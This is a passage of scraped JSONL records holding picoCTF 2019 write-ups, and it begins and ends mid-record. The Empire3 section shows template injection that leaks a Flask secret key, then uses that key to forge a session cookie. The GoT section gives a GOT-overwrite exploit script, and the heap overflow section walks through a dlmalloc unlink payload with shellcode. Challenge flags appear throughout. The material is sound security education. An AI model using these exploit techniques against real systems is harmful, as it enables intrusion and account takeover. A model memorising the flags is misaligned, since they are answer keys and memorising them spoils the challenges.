'__init__.py')).read()}}'\r\n\r\nfrom flask import Flask\r\nfrom app.config import Config\r\nfrom flask_sqlalchemy import SQLAlchemy\r\nfrom flask_login import LoginManager\r\nfrom flask_bootstrap import Bootstrap\r\nimport time,atexit\r\nfrom apscheduler.schedulers.background import BackgroundScheduler\r\n\r\napp = Flask(__name__)\r\napp.config.from_object(Config)\r\ndb = SQLAlchemy(app)\r\nlogin = LoginManager(app)\r\nlogin.login_view = 'login'\r\nbootstrap=Bootstrap(app)\r\n\r\nfrom app import routes,models\r\n\r\ndef DB_init(db):\r\n    db.drop_all()\r\n    db.create_all()\r\n\r\n    u = models.User(username='jarrett.booz',password_hash='deadbeef',id=1,admin=0,secret='Likes Oreos.', name=\"Jarrett Booz\")\r\n    db.session.add(u)\r\n\r\n    u = models.User(username='danny.tunitis',password_hash='deadbeef',id=2,admin=0,secret='Know it all.', name= \"Danny Tunitis\")\r\n    db.session.add(u)\r\n\r\n    c = models.Todo(item='Shrink the moon', user_id=1)\r\n    db.session.add(c)\r\n\r\n    c = models.Todo(item='Grab the moon', user_id=1)\r\n    db.session.add(c)\r\n\r\n    c = models.Todo(item='Sit on the toilet', user_id=1)\r\n    db.session.add(c)\r\n\r\n    c = models.Todo(item='Make 2000 more Pico problems', user_id=2)\r\n    db.session.add(c)\r\n\r\n    c = models.Todo(item='Do dastardly plan: picoCTF{cookies_are_a_sometimes_food_8038d44f}', user_id=2)\r\n    db.session.add(c)\r\n\r\n    c = models.Todo(item='Buy milk', user_id=2)\r\n    db.session.add(c)\r\n\r\n    db.session.commit()\r\n\r\ntry:\r\n    DB_init(db)\r\n    scheduler = BackgroundScheduler()\r\n    scheduler.add_job(func=DB_init,args=(db,),trigger=\"interval\",hours=2)\r\n    scheduler.start()\r\n    atexit.register(lambda: scheduler.shutdown())\r\nexcept Exception as e:\r\n    print(e)\r\n```\r\n\r\nThe flag is related to cookies (`picoCTF{cookies_are_a_sometimes_food_8038d44f}`), so again, this looked like an unintended solution.\r\n\r\n## Additional Solution\r\n\r\nAn additional way to solve the challenge, based on [another writeup](http://cyberchallenge.unica.it/index.php/2019/10/13/web-empire3/). This is probably the intended solution. It's also pretty similar to last year's [Flaskcards Skeleton Key](/2018_picoCTF/Flaskcards%20Skeleton%20Key.md)\r\n\r\nFirst, we read the Flask configuration to get the secret key used for signing the cookies:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Empire3# python shell.py\r\nLogged in\r\n(Cmd) send config\r\nSending: '{{config}}'\r\n\r\n<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': '9806d62bb5f4986c09a3872abf448e85', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'SQLALCHEMY_DATABASE_URI': 'sqlite://', 'SQLALCHEMY_TRACK_MODIFICATIONS': False, 'SQLALCHEMY_BINDS': None, 'SQLALCHEMY_NATIVE_UNICODE': None, 'SQLALCHEMY_ECHO': False, 'SQLALCHEMY_RECORD_QUERIES': None, 'SQLALCHEMY_POOL_SIZE': None, 'SQLALCHEMY_POOL_TIMEOUT': None, 'SQLALCHEMY_POOL_RECYCLE': None, 'SQLALCHEMY_MAX_OVERFLOW': None, 'SQLALCHEMY_COMMIT_ON_TEARDOWN': False, 'SQLALCHEMY_ENGINE_OPTIONS': {}, 'BOOTSTRAP_USE_MINIFIED': True, 'BOOTSTRAP_CDN_FORCE_SSL': False, 'BOOTSTRAP_QUERYSTRING_REVVING': True, 'BOOTSTRAP_SERVE_LOCAL': False, 'BOOTSTRAP_LOCAL_SUBDOMAIN': None}>\r\n\r\n(Cmd) exit\r\n\r\n```\r\n\r\nWe sign in and save the cookie:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Empire3# base_url=https://2019shell1.picoctf.com/problem/45132; curl \"$base_url/login\" --cookie \"cookies.txt\" --cookie-jar \"cookies.txt\" -s -v --data \"csrf_token=$(curl \"$base_url/login\" --cookie \"cookies.txt\" --cookie-jar \"cookies.txt\" -s | grep csrf | awk '{ printf $5 }' | sed 's/value=\"//g' | sed 's/\">//')&username=user&password=password\" 2>&1 | grep Cookie\r\n> Cookie: session=.eJwlz01qAzEMQOG7eJ2FrV8rlxksWaKl0MJMsiq9ewI9wIPv_bajzrw-2v1xPvPWjs_d7s2oyhZKMuvWRaG5t0lIUJnN3jt31k7u5emTF8gyU89hsIcKgc_ZR6DtLMYOYzDhnrrUapoQaRlwLjIK4aANDEHqIqPIV7u1uM46Hj9f-f32qK5wMcG5MYeiR6Qr9EBWzHCLTJjA7-555fk_ge3vBWc8PpY.XaXtmg.iKsUADWNOPFQ4iKm3eYHoF4v0qI\r\n< Vary: Cookie\r\n```\r\n\r\nWe decode the cookie with [flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager) (note that I had to use the Python3 version this time, as the Python2 version created cookies that were rejected by the server in the next step):\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Empire3# c=.eJwlz01qAzEMQOG7eJ2FrV8rlxksWaKl0MJMsiq9ewI9wIPv_bajzrw-2v1xPvPWjs_d7s2oyhZKMuvWRaG5t0lIUJnN3jt31k7u5emTF8gyU89hsIcKgc_ZR6DtLMYOYzDhnrrUapoQaRlwLjIK4aANDEHqIqPIV7u1uM46Hj9f-f32qK5wMcG5MYeiR6Qr9EBWzHCLTJjA7-555fk_ge3vBWc8PpY.XaXtmg.iKsUADWNOPFQ4iKm3eYHoF4v0qI\r\n\r\nroot@kali:/media/sf_CTFs/pico/Empire3# python3 ~/utils/flask-session-cookie-manager/flask_session_cookie_manager3.py decode -s '9806d62bb5f4986c09a3872abf448e85' -c \"$c\"\r\n{'_fresh': True, '_id': '94ff9a36e557d7a4c7edd96c6c4f998000505704bbfbeb85a26a997be192d17642b8801c39def530211543d87a79f896447f925ea494c65c4d252c47b661f4ba', 'csrf_token': '77acb69638d3e173bcceb720c3573ecb9cee2825', 'user_id': '3'}\r\n```\r\n\r\nEdit the cookie and set `user_id` to `2` instead of `3`:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Empire3# python3 ~/utils/flask-session-cookie-manager/flask_session_cookie_manager3.py encode -s '9806d62bb5f4986c09a3872abf448e85' -t \"{'_fresh': True, '_id': '94ff9a36e557d7a4c7edd96c6c4f998000505704bbfbeb85a26a997be192d17642b8801c39def530211543d87a79f896447f925ea494c65c4d252c47b661f4ba', 'csrf_token': '77acb69638d3e173bcceb720c3573ecb9cee2825', 'user_id': '2'}\"\r\n.eJwlz0lqAzEQQNG7aO2FVKpB5cs0qomEQALd9irk7jbkAB_e_21HnXl9tPvjfOatHZ_R7k2xSvfkJJKQjS4ZoezsWKqr906dpKNZWdqiDbxVxXIoxBBGsLX68KmRRbPDGIQzlmzRWsqIUgqUGxWdyTGAwFGMeRTabrfm11nH4-crv98eke3GynPFzCHT3NMEuk-SmW7qmbCA3t3zyvN_AtrfC2c5PpU.XaX3qA.ORVdqh-0iJQkIjXNcElr5vSPjZY\r\n```\r\n\r\nList the TODOs with for user 2 and read the flag:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Empire3# curl \"$base_url/list_items\" -H \"Cookie: session=.eJwlz0lqAzEQQNG7aO2FVKpB5cs0qomEQALd9irk7jbkAB_e_21HnXl9tPvjfOatHZ_R7k2xSvfkJJKQjS4ZoezsWKqr906dpKNZWdqiDbxVxXIoxBBGsLX68KmRRbPDGIQzlmzRWsqIUgqUGxWdyTGAwFGMeRTabrfm11nH4-crv98eke3GynPFzCHT3NMEuk-SmW7qmbCA3t3zyvN_AtrfC2c5PpU.XaX3qA.ORVdqh-0iJQkIjXNcElr5vSPjZY\" -s | grep picoCTF\r\n                                <strong>Very Urgent: </strong>Do dastardly plan: picoCTF{cookies_are_a_sometimes_food_8038d44f}\r\n```\r\n", "timestamp": "2025-10-21T13:36:25.911824"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_picoCTF/Flags.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Flags.md", "content": "# Flags\r\nCryptography, 200 points\r\n\r\n## Description:\r\n> What do the flags mean?\r\n![](images/flags.png)\r\n\r\n## Solution: \r\n\r\n\r\nAt first glance, this looks like a simple substitution cipher. The flag format fits the template, so we can safely assume that the sequence starts with \"picoctf\". The theory is strengthened by the fact that the blue-white-red flag repeats itself twice, and matches `C`'s location.\r\n\r\nThis brings us to:\r\n```\r\npicoctf{f??????????ff}\r\n```\r\n\r\nLet's assume that the phrase within the curly brackets is meaningful, as most flags are. Since this is a challenge about flags, and the first word starts with an `F`, we can guess that it is `flags` (which makes more sense than `flag`).\r\n\r\nThis brings us to:\r\n```\r\npicoctf{flagsa??s??ff}\r\n```\r\n\r\nMy best guess for the flag at this stage was `picoctf{flagsandstuff}`, however that didn't work, and neither did `picoctf{flagsarestuff}`. Several other longshots didn't work either.\r\n\r\nFinally, I googled \"[flag red diamond](https://www.google.com/search?client=firefox-b-d&q=flag+red+dimond)\" which brought me to the wonderful Wikipedia page [Gallery of flags with diamonds](https://commons.wikimedia.org/wiki/Gallery_of_flags_with_diamonds). There, I spotted [ICS flag foxtrot](https://commons.wikimedia.org/wiki/Gallery_of_flags_with_diamonds#/media/File:ICS_Foxtrot.svg) which seemed like a great lead since `foxtrot` is one of those words you only hear when someone is spelling out `F` in a phonetic alphabet.\r\n\r\nSearching for `ICS Flags` brings us to the [International maritime signal flags](https://en.wikipedia.org/wiki/International_maritime_signal_flags) Wikipedia entry, where all the flags are listed. \r\n\r\nAfter decoding, the flag turned out to be `PICOCTF{F1AG5AND5TUFF}`.", "timestamp": "2025-10-21T13:36:26.012777"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_picoCTF/Forky.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Forky.md", "content": "# Forky\r\nReverse Engineering, 500 points\r\n\r\n## Description:\r\n> In this program, identify the last integer value that is passed as parameter to the function doNothing(). \r\n\r\n## Solution: \r\n\r\nLet's check the binary we've received:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Forky# file ./vuln\r\n./vuln: ELF 32-bit LSB pie executable Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=07ba8a5f157f85c5da80ebf5bd64b33cc60e98b6, not stripped\r\nroot@kali:/media/sf_CTFs/pico/Forky# ./vuln\r\nroot@kali:/media/sf_CTFs/pico/Forky#\r\n```\r\n\r\nDoesn't do much. The Ghidra decompiler shows the following code:\r\n\r\n```c\r\nundefined4 main(undefined1 param_1)\r\n{\r\n  int *piVar1;\r\n  \r\n  piVar1 = (int *)mmap((void *)0x0,4,3,0x21,-1,0);\r\n  *piVar1 = 1000000000;\r\n  fork();\r\n  fork();\r\n  fork();\r\n  fork();\r\n  *piVar1 = *piVar1 + 0x499602d2;\r\n  doNothing(*piVar1);\r\n  return 0;\r\n}\r\n\r\nvoid doNothing(undefined4 param_1)\r\n{\r\n  __x86.get_pc_thunk.ax();\r\n  return;\r\n}\r\n\r\n```\r\n\r\nSo this program recursively forks itself and calls `doNothing`. We need to identify last integer value that is passed as parameter to `doNothing()`.\r\n\r\nIf this question isn't timing-dependent, I don't understand why. In any case, I started by trying to utilize GDB to provide the answer, with the following command:\r\n\r\n```console\r\ngdb ./vuln -ex 'set follow-fork-mode child' -ex 'dprintf *doNothing+19, \"%d\\n\", $eax' -ex 'r' -ex 'q'\r\n```\r\n\r\nWhen `fork` is called in a program and a child process is created, GDB must choose which process it should debug. The default is to continue debugging the parent, but there's a setting to request GDB to attach to the child instead: `set follow-fork-mode child`.\r\n\r\nAfter requesting GDB to attach to the child upon every fork, the command above uses `dprintf` to print `eax` at the following location:\r\n```assembly\r\ngdb-peda$ disas doNothing\r\nDump of assembler code for function doNothing:\r\n   0x0000054d <+0>:     push   ebp\r\n   0x0000054e <+1>:     mov    ebp,esp\r\n   0x00000550 <+3>:     sub    esp,0x10\r\n   0x00000553 <+6>:     call   0x5fa <__x86.get_pc_thunk.ax>\r\n   0x00000558 <+11>:    add    eax,0x1a7c\r\n   0x0000055d <+16>:    mov    eax,DWORD PTR [ebp+0x8]\r\n   0x00000560 <+19>:    mov    DWORD PTR [ebp-0x4],eax <----------------- eax will be printed here\r\n   0x00000563 <+22>:    nop\r\n   0x00000564 <+23>:    leave\r\n   0x00000565 <+24>:    ret\r\nEnd of assembler dump.\r\n```\r\n\r\nThe answer I received is `1104081276`, which wasn't accepted by the server.\r\n\r\nInstead of a runtime solution, let's try to calculate what should happen. The first process creates 4 children. The first child creates 3 children, the second 2 children, the third 1 child and the forth 0 children. This continues recursively. This means that we'll have 16 processes altogether. Here's a diagram that might help visualize this:\r\n\r\n```\r\n +                                                                     \r\n |                                                                     \r\n +-----------------------------------+                                 \r\n |                                   |                                 \r\n +-----------------+                 +-----------------+               \r\n |                 |                 |                 |               \r\n +--------+        +--------+        +--------+        +--------+      \r\n |        |        |        |        |        |        |        |      \r\n +---+    +---+    +---+    +---+    +---+    +---+    +---+    +---+  \r\n |   |    |   |    |   |    |   |    |   |    |   |    |   |    |   |  \r\n O   O    O   O    O   O    O   O    O   O    O   O    O   O    O   O  \r\n```\r\n\r\nEvery `O` is a process, where the leftmost process is the parent which forks 4 children and so on.\r\n\r\nWe can double check this calculation using `ltrace -f`:\r\n\r\n> -f: Trace child processes as they are created by currently traced processes as a result of the fork(2) or clone(2) system calls. The new process is attached immediately.\r\n\r\nOutput:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Forky# ltrace -f ./vuln 2>&1 | grep \"+++ exited\"\r\n[pid 3877] +++ exited (status 0) +++\r\n[pid 3881] +++ exited (status 0) +++\r\n[pid 3880] +++ exited (status 0) +++\r\n[pid 3882] +++ exited (status 0) +++\r\n[pid 3879] +++ exited (status 0) +++\r\n[pid 3883] +++ exited (status 0) +++\r\n[pid 3884] +++ exited (status 0) +++\r\n[pid 3886] +++ exited (status 0) +++\r\n[pid 3887] +++ exited (status 0) +++\r\n[pid 3888] +++ exited (status 0) +++\r\n[pid 3891] +++ exited (status 0) +++\r\n[pid 3890] +++ exited (status 0) +++\r\n[pid 3889] +++ exited (status 0) +++\r\n[pid 3885] +++ exited (status 0) +++\r\n[pid 3878] +++ exited (status 0) +++\r\n[pid 3892] +++ exited (status 0) +++\r\nroot@kali:/media/sf_CTFs/pico/Forky# ltrace -f ./vuln 2>&1 | grep \"+++ exited\" | wc -l\r\n16\r\n```\r\n\r\nSo, if we understand correctly what the question is asking from us, we need to calculate `1000000000 + (16 * 0x499602d2)`, taking into consideration integer overflow and sign:\r\n\r\n```python\r\n>>> import numpy\r\n>>> base = numpy.int32(1000000000)\r\n>>> step = numpy.int32(0x499602d2)\r\n>>> base + 16*step\r\n__main__:1: RuntimeWarning: overflow encountered in long_scalars\r\n-721750240\r\n```\r\n\r\nIndeed, `picoCTF{-721750240}` was accepted as an answer.\r\n\r\n", "timestamp": "2025-10-21T13:36:26.116667"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_picoCTF/GoT.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/GoT.md", "content": "# GoT\r\nBinary Exploitation, 350 points\r\n\r\n## Description:\r\n> You can only change one address, here is the problem: program.\r\n\r\n```c\r\n#include <stdlib.h>\r\n#include <stdio.h>\r\n#include <string.h>\r\n\r\n#define FLAG_BUFFER 128\r\n\r\nvoid win() {\r\n  char buf[FLAG_BUFFER];\r\n  FILE *f = fopen(\"flag.txt\",\"r\");\r\n  fgets(buf,FLAG_BUFFER,f);\r\n  puts(buf);\r\n  fflush(stdout);\r\n}\r\n\r\n\r\nint *pointer;\r\n\r\nint main(int argc, char *argv[])\r\n{\r\n  \r\n   puts(\"You can just overwrite an address, what can you do?\\n\");\r\n   puts(\"Input address\\n\");\r\n   scanf(\"%d\",&pointer);\r\n   puts(\"Input value?\\n\");\r\n   scanf(\"%d\",pointer);\r\n   puts(\"The following line should print the flag\\n\");\r\n   exit(0);\r\n}\r\n\r\n```\r\n\r\n\r\n## Solution:\r\n\r\nThis challenge is similar to last year's [got-shell](/2018_picoCTF/got-shell.md). We overwrite the `.got.plt` entry for `exit` with the address of `win`, and `win` gets called instead of `exit`, printing the flag.\r\n\r\n```python\r\n# First, generate a pwntools template using:\r\n# pwn template --host 2019shell1.picoctf.com --user dvdalt --path /problems/got_6_6847d8dfcf9a22a7981ba5d338501c50/vuln\r\n\r\n#===========================================================\r\n#                    EXPLOIT GOES HERE\r\n#===========================================================\r\n# Arch:     i386-32-little\r\n# RELRO:    Partial RELRO\r\n# Stack:    Canary found\r\n# NX:       NX enabled\r\n# PIE:      No PIE (0x8048000)\r\n\r\nimport os\r\n\r\nif shell is not None:\r\n    shell.set_working_directory(os.path.dirname(remote_path))\r\n\r\nio = start()\r\n\r\nlog.info(\"Address of 'exit' .got.plt entry: {}\".format(hex(exe.got['exit'])))\r\nlog.info(\"Address of 'win': {}\".format(hex(exe.symbols['win'])))\r\nio.sendlineafter(\"Input address\", str(exe.got['exit']))\r\nio.sendlineafter(\"Input value?\", str(exe.symbols['win']))\r\nprint io.recvall()\r\n```\r\n\r\nOutput:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/GoT# python exploit.py\r\n[*] '/media/sf_CTFs/pico/GoT/vuln'\r\n    Arch:     i386-32-little\r\n    RELRO:    Partial RELRO\r\n    Stack:    Canary found\r\n    NX:       NX enabled\r\n    PIE:      No PIE (0x8048000)\r\n[+] Connecting to 2019shell1.picoctf.com on port 22: Done\r\n[*] dvdalt@2019shell1.picoctf.com:\r\n    Distro    Ubuntu 18.04\r\n    OS:       linux\r\n    Arch:     amd64\r\n    Version:  4.15.0\r\n    ASLR:     Enabled\r\n[+] Opening new channel: 'pwd': Done\r\n[+] Receiving all data: Done (13B)\r\n[*] Closed SSH channel with 2019shell1.picoctf.com\r\n[*] Working directory: '/tmp/tmp.VgJr6w5yT6'\r\n[+] Opening new channel: 'ln -s /home/dvdalt/* .': Done\r\n[+] Receiving all data: Done (0B)\r\n[*] Closed SSH channel with 2019shell1.picoctf.com\r\n[*] Working directory: '/problems/got_6_6847d8dfcf9a22a7981ba5d338501c50'\r\n[+] Starting remote process '/problems/got_6_6847d8dfcf9a22a7981ba5d338501c50/vuln' on 2019shell1.picoctf.com: pid 126609\r\n[*] Address of 'exit' .got.plt entry: 0x804a01c\r\n[*] Address of 'win': 0x80485c6\r\n[+] Receiving all data: Done (85B)\r\n[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 126609)\r\n\r\n\r\nThe following line should print the flag\r\n\r\npicoCTF{A_s0ng_0f_1C3_and_f1r3_2a9d1eaf}\r\n```", "timestamp": "2025-10-21T13:36:26.246864"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_picoCTF/Heap_overflow.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Heap_overflow.md", "content": "# Heap overflow\r\nBinary Exploitation, 450 points\r\n\r\n## Description:\r\n> Just pwn this using a heap overflow taking advantage of douglas malloc free program and get a flag.\r\n\r\n```c\r\n#include <stdlib.h>\r\n#include <stdio.h>\r\n#include <string.h>\r\n\r\n#define FLAGSIZE 128\r\n\r\nvoid win() {\r\n  char buf[FLAGSIZE];\r\n  FILE *f = fopen(\"flag.txt\",\"r\");\r\n  fgets(buf,FLAGSIZE,f);\r\n  fprintf(stdout,\"%s\\n\",buf);\r\n  fflush(stdout);\r\n}\r\n\r\nint main(int argc, char *argv[])\r\n{\r\n   char *fullname, *name, *lastname;\r\n   fullname = malloc(666);\r\n   name = malloc(66);\r\n   lastname = malloc(66);\r\n   printf(\"Oops! a new developer copy pasted and printed an address as a decimal...\\n\");\r\n   printf(\"%d\\n\",fullname);\r\n   printf(\"Input fullname\\n\");\r\n   gets(fullname);\r\n   printf(\"Input lastname\\n\");\r\n   gets(lastname);\r\n   free(fullname);\r\n   puts(\"That is all...\\n\");\r\n   free(name);\r\n   free(lastname);\r\n   exit(0);\r\n}\r\n```\r\n\r\nHints:\r\n\r\n* https://www.win.tue.nl/~aeb/linux/hh/hh-11.html\r\n\r\n## Solution:\r\n\r\nThis is an artificial example taken from [Secure Coding in C and C++](https://www.amazon.com/Secure-Coding-2nd-Software-Engineering/dp/0321822137). A complete analysis of the example exists in the book (section 4.6, Doug Lea's Memory Allocator, a.k.a. `dlmalloc`), and this writeup is inspired by it. \r\n\r\nThe vulnerability here is a classic *heap overflow*, caused by an unbound read to a heap buffer: `gets(fullname)`.\r\n\r\nUsing this vulnerability, it is possible to write a DWORD to an arbitrary memory location. In order to understand how this is done, we need to understand the `dlmalloc` heap.\r\n\r\nIn this heap implementation, the heap is divided into chunks. When a user calls `malloc`, the heap manager allocates a chunk and returns it to the user. However, the address that `malloc` returns isn't the beginning of the chunk - there is some metadata before it. \r\n\r\nThis is how a heap chunk looks like when it is allocated:\r\n\r\n```\r\n                                +------------------------+---+\r\n                                | Size of chunk          | P |\r\nPointer returned by malloc -->  +------------------------+---+\r\n                                | User Data                  |\r\n                                |                            |\r\n                                |                            |\r\n                                |                            |\r\n                                |                            |\r\n                                +----------------------------+\r\n```\r\n\r\nThe size of the chunk is saved in the DWORD before the address which is returned to the user, or in 31 bits of that DWORD, to be precise. Since chunk sizes are always a multiple of 2, the least significant bit (marked as `P` for `PREV_INUSE`) is used to indicates whether the previous chunk is in use or not.\r\n\r\nWhen this chunk is freed by the user, it is inserted into a \"bin\" which holds multiple free chunks with similar attributes (e.g. a bin for small chunks, medium chunks, large chunks).\r\nEach bin is implemented as a doubly linked list. As a free chunk, the chunk structure changes:\r\n```\r\n                                +------------------------+---+\r\n                                | Size of chunk          | P |\r\nPointer returned by malloc -->  +------------------------+---+\r\n                                | Forward Pointer            |\r\n                                +----------------------------+\r\n                                | Back Pointer               |\r\n                                +----------------------------+\r\n                                | Unused                     |\r\n                                |                            |\r\n                                +----------------------------+\r\n                                | Size of chunk              |\r\n                                +----------------------------+\r\n```\r\n\r\nInstead of the first two DWORDs of the user data, forward and back pointers related to the appropriate bin's doubly linked list are saved. The forward pointer points to the next free chunk in the bin, and the back pointer points to the previous free chunk in the bin (not to be confused with the previous chunk which `PREV_INUSE` refers to - that's just the chunk who happens to be adjacent to this one in memory).\r\n\r\nHere's an illustration of the different states of the chunk, side by size:\r\n\r\n```\r\n                                           Allocated                       Free\r\n                                +------------------------+---+  +------------------------+---+\r\n                                | Size of chunk          | P |  | Size of chunk          | P |\r\nPointer returned by malloc -->  +------------------------+---+  +------------------------+---+\r\n                                | User Data                  |  | Forward Pointer            |\r\n                                +                            +  +----------------------------+\r\n                                |                            |  | Back Pointer               |\r\n                                +                            +  +----------------------------+\r\n                                |                            |  | Unused                     |\r\n                                |                            |  |                            |\r\n                                +                            +  +----------------------------+\r\n                                |                            |  | Size of chunk              |\r\n                                +----------------------------+  +----------------------------+\r\n```\r\n\r\nNow, memory is freed via `free`, the heap manager also tries to consolidate adjacent in order to create a single large chunk and avoid memory fragmentation. This means that if the chunk located before the current chunk is free, the heap manager will merge both of them together. Then, if the chunk located after the current chunk is free, the heap manager will merge them too. In case the current chunk is merged with an adjacent chunk, the adjacent chunk needs to be removed from the bin it was in.\r\n\r\nThe code that's used to remove a chunk from its bin is implemented as a macro called `unlink`:\r\n```c\r\n#define unlink(P, BK, FD) { \\\r\n    FD = P->fd;  \\\r\n    BK = P->bk;  \\\r\n    FD->bk = BK; \\\r\n    BK->fd = FD; \\\r\n}\r\n```\r\n\r\nThis is pretty standard code for removing an element from a doubly-linked list.\r\n\r\nWhat happens when there's a buffer overflow on the heap? In this case, the attacker is able to overwrite some metadata from the next chunk. When the current chunk is freed, the malicious metadata will be used to trick the heap manager into performing unintended actions.\r\n\r\nLet's walk through the attack with our example.\r\n\r\nThe program allocates three buffers: \r\n```c\r\n   fullname = malloc(666);\r\n   name = malloc(66);\r\n   lastname = malloc(66);\r\n```\r\n\r\nHere's how the heap looks like after the allocations are done:\r\n```\r\n---------------+------------------------+---+ \r\n               | 672                    | P | \r\nfirstname -->  +------------------------+---+ --+\r\n               | User Data                  |   |\r\n               +                            +   |\r\n               |                            |   |\r\n               +                            +   | 666 bytes\r\n               |                            |   |\r\n               |                            |   |\r\n               +                            +   |\r\n               |                            | --+\r\n---------------+------------------------+---+\r\n               | 72                     | 1 | \r\nname ------->  +------------------------+---+ --+\r\n               | User Data                  |   |\r\n               +                            +   |\r\n               |                            |   |\r\n               +                            +   | 66 bytes\r\n               |                            |   |\r\n               |                            |   |\r\n               +                            +   |\r\n               |                            | --+\r\n---------------+------------------------+---+ \r\n               | 72                     | 1 | \r\nlastname --->  +------------------------+---+ --+\r\n               | User Data                  |   |\r\n               +                            +   |\r\n               |                            |   | \r\n               +                            +   | 66 bytes\r\n               |                            |   |\r\n               |                            |   |\r\n               +                            +   |\r\n               |                            | --+\r\n---------------+----------------------------+ \r\n```\r\n\r\nThe sizes are a result of taking the size that the user requested, adding 4 for the size DWORD itself and rounding up to the next multiple of 8 bytes.\r\n\r\nThe payload we'll be sending as input for `gets(fullname)` will be as follows:\r\n\r\n```python\r\nshell_code = asm('jmp l1; nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop; l1: push {}; ret;'.format(hex(exe.symbols[\"win\"])))\r\npayload = shell_code + ('B' * (664-len(shell_code))) + p32(100, sign = \"signed\") + p32(-4, sign = \"signed\") + p32(exe.got[\"puts\"] - 12) + p32(address)\r\n```\r\n\r\nThis will cause the heap to look as follows:\r\n```\r\n---------------+------------------------+---+ \r\n               | 672                    | P | \r\nfirstname -->  +------------------------+---+ --+\r\n               | shellcode + filler         |   |\r\n               +                            +   |\r\n               |                            |   |\r\n               +                            +   | 666 bytes\r\n               |                            |   |\r\n               |                            |   |\r\n               +----------------------------+   |\r\n               | 100                    | 0 | --+\r\n---------------+------------------------+---+\r\n               | -4                     | 0 | \r\nname ------->  +------------------------+---+ --+\r\n               | exe.got[\"puts\"] - 12       |   |\r\n               +----------------------------+   |\r\n               | address of firstname       |   |\r\n               +----------------------------+   | 66 bytes\r\n               |                            |   |\r\n               |                            |   |\r\n               +                            +   |\r\n               |                            | --+\r\n---------------+------------------------+---+ \r\n               | 72                     | 1 | \r\nlastname --->  +------------------------+---+ --+\r\n               | User Data                  |   |\r\n               +                            +   |\r\n               |                            |   | \r\n               +                            +   | 66 bytes\r\n               |                            |   |\r\n               |                            |   |\r\n               +                            +   |\r\n               |                            | --+\r\n---------------+----------------------------+ \r\n```\r\n\r\nNow, `free` is called on `firstname`. The heap manager wants to check if the chunk following `firstname` is in use. If it isn't, they will both be merged. So, the heap manager goes one DWORD backwards, and reads the size of the current chunk (672). It then jumps over the current chunk (chunk #1) to arrive to the metadata DWORD of the next chunk (chunk #2):\r\n\r\n```\r\n+------------------------+---+\r\n| -4                     | 0 | \r\n+------------------------+---+\r\n```\r\n\r\nThe heap manager needs to know if this chunk (chunk #2) is in use. It therefore must **jump over** this chunk (chunk #2) and arrive to **the chunk after it** (chunk #3). Remember that the `PREV_INUSE` bit of our current location refers to chunk #1, and the information about chunk #2 is located in the chunk after it, chunk #3.\r\n\r\nSo, the heap manager takes the address of chunk #2, adds the size of the chunk (-4 due to our attack) and jumps to that location:\r\n\r\n```\r\n+----------------------------+\r\n| 100                    | 0 |\r\n+------------------------+---+\r\n```\r\n\r\nThe size in the chunk doesn't really matter, what matters is that the malicious payload made sure that the number is even, i.e. `PREV_INUSE` = 0. (Sometimes it is recommended to send `-4` as well, since this number is even, has no NULL bytes and is interpreted as a large unsigned int which ensures that no `fastbin`-related logic will be involved).\r\nThe fact that `PREV_INUSE` = 0 means that the heap manager can merge both chunks safely. As a result, chunk #2 needs to be removed from its current bin. `unlink` is called on chunk #2. Let's see how it behaves:\r\n\r\n```c\r\nFD = P->fd;  // FD points to (exe.got[\"puts\"] - 12), since that's the value we overran the buffer with\r\nBK = P->bk;  // BK points to (address of firstname), since that's the value we overran the buffer with\r\nFD->bk = BK; // (exe.got[\"puts\"] - 12) + 12 = (address of firstname); We wrote an arbitrary DWORD to an arbitrary location\r\nBK->fd = FD; // (address of firstname) + 8 = (exe.got[\"puts\"] - 12); Side effect\r\n```\r\n\r\nThe `unlink` macro allowed us to overwrite the .got.plt address of `puts` with the address of our shellcode. Notice that as a side-effect, some of the shellcode was overwritten. That's the reason the shellcode needs to be built as a \"trampoline\":\r\n\r\n```python\r\nshell_code = asm('jmp l1; nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop; l1: push {}; ret;'.format(hex(exe.symbols[\"win\"])))\r\n```\r\n\r\nThe first few bytes don't get overwritten, and they allow us to jump over the 